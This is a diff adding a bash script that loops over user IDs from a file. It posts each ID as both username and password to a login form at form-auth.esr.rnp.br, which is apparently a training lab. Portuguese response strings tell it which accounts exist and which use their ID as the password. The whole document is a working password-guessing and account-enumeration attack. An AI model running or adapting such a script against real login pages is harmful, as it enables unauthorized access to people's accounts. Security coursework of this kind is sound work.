@@ -1,0 +1,15 @@
+#!/bin/bash
+
+for id in $(cat ids) 
+do
+   resp=$(curl -s --data "userid=$id&senha=$id&Submit1=Login" \
+          http://form-auth.esr.rnp.br/login.php)
+   if [ $(echo $resp | grep -c "senha incorreta") -ne 0 ];
+   then
+      echo "($id, ?)"
+   elif [ $(echo $resp | grep -c "bem-vindo") -ne 0 ];
+   then
+      echo "($id ,$id)"
+   fi
+done
+
